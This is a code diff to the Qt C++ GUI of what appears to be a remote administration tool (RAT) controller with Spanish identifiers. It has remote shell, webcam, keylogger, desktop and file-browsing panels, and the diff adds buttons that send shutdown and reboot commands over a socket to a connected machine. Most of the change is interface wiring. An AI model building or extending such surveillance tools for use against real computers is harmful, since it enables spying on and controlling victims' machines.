@@ -39,28 +39,31 @@ MainWindow::MainWindow ( QWidget *parent ) :
   ui->listaOpciones->item(0)->setIcon(icono);
   icono.addFile("./icons/document-preview.png");
   ui->listaOpciones->item(1)->setIcon(icono);
-  icono.addFile("./icons/shell.png");
+  icono.addFile("./icons/preferencias.png");
   ui->listaOpciones->item(2)->setIcon(icono);
-  icono.addFile("./icons/drive-harddisk.png");
+  icono.addFile("./icons/shell.png");
   ui->listaOpciones->item(3)->setIcon(icono);
-  icono.addFile("./icons/user-desktop.png");
+  icono.addFile("./icons/drive-harddisk.png");
   ui->listaOpciones->item(4)->setIcon(icono);
-  icono.addFile("./icons/camera-web.png");
+  icono.addFile("./icons/user-desktop.png");
   ui->listaOpciones->item(5)->setIcon(icono);
-  icono.addFile("./icons/input-keyboard.png");
+  icono.addFile("./icons/camera-web.png");
   ui->listaOpciones->item(6)->setIcon(icono);
-  icono.addFile("./icons/emblem-important.png");
+  icono.addFile("./icons/input-keyboard.png");
   ui->listaOpciones->item(7)->setIcon(icono);
-  icono.addFile("./icons/face-smile-big.png");
+  icono.addFile("./icons/emblem-important.png");
   ui->listaOpciones->item(8)->setIcon(icono);
-  icono.addFile("./icons/im-user.png");
+  icono.addFile("./icons/face-smile-big.png");
   ui->listaOpciones->item(9)->setIcon(icono);
+  icono.addFile("./icons/im-user.png");
+  ui->listaOpciones->item(10)->setIcon(icono);
 
   //Ordenar los frmase en un Layout, frames a la derecha y menu de opciones a la izquierda
   layoutPrincipal = new QGridLayout ( ui->centralWidget );
   layoutPrincipal->addWidget ( ui->listaOpciones );
   layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
   layoutPrincipal->addWidget ( ui->frameInformacion,0,1 );
+  layoutPrincipal->addWidget ( ui->frameSistema,0,1 );
   layoutPrincipal->addWidget ( ui->frameArchivos,0,1 );
   layoutPrincipal->addWidget ( ui->frameLicencia,0,1 );
   layoutPrincipal->addWidget ( ui->frameShellRemota,0,1 );
@@ -84,6 +87,8 @@ MainWindow::MainWindow ( QWidget *parent ) :
   connect ( ui->botonWebcam,SIGNAL(clicked()),this,SLOT(abrirVentanaWebcam()));
   connect ( ui->botonReiniciar,SIGNAL ( clicked() ),this,SLOT ( reinciar() ) );
   connect ( ui->botonDesinfectar,SIGNAL ( clicked() ),this,SLOT ( desinfectar() ) );
+  connect ( ui->botonApagar,SIGNAL(clicked()),this,SLOT(apagarEquipo()));
+  connect ( ui->botonReiniciarEquipo,SIGNAL(clicked()),this,SLOT(reiniciarEquipo()));
   connect ( ui->botonMostrar,SIGNAL ( clicked() ),this,SLOT ( enviarMensaje() ) );
   connect ( ventana.directoriosLista(),SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( directorioCambio() ) );
   connect ( ventana.botonIr(),SIGNAL ( clicked() ),this,SLOT ( archivosIr() ) );
@@ -165,6 +170,7 @@ void MainWindow::esconderFrames()
   /** Esta funcion esconde todos los frames **/
   ui->frameConexion->hide();
   ui->frameInformacion->hide();
+  ui->frameSistema->hide();
   ui->frameShellRemota->hide();
   ui->frameArchivos->hide();
   ui->frameLicencia->hide();
@@ -193,39 +199,44 @@ void MainWindow::listaOpciones()
     }
     case ( 2 ) :
     {
-      ui->frameShellRemota->show();
+      ui->frameSistema->show();
       break;
     }
     case ( 3 ) :
     {
-      ui->frameArchivos->show();
+      ui->frameShellRemota->show();
       break;
     }
     case ( 4 ) :
     {
-      ui->frameEscritorio->show();
+      ui->frameArchivos->show();
       break;
     }
     case ( 5 ) :
     {
-      ui->frameWebcam->show();
+      ui->frameEscritorio->show();
       break;
     }
     case ( 6 ) :
     {
-      ui->frameKeylogger->show();
+      ui->frameWebcam->show();
       break;
     }
     case ( 7 ) :
     {
-      ui->frameMensajes->show();
+      ui->frameKeylogger->show();
       break;
     }
     case ( 8 ) :
     {
-        break;
+      ui->frameMensajes->show();
+      break;
     }
     case ( 9 ) :
+    {
+        break;
+    }
+    case ( 10 ) :
     {
         ui->frameChat->show();
         break;
@@ -839,4 +850,13 @@ void MainWindow::traducir(QAction *idioma)
     if(idioma->text() == ui->actionAlem_n->text())
         traductor.load("cliente_de.qm");
     QApplication::installTranslator(&traductor);
+}
+void MainWindow::apagarEquipo()
+{
+    util.escribirSocket("apagarequipo|@|",socket[activo]);
+
+}
+void MainWindow::reiniciarEquipo()
+{
+    util.escribirSocket("reiniciarequipo|@|",socket[activo]);
 }
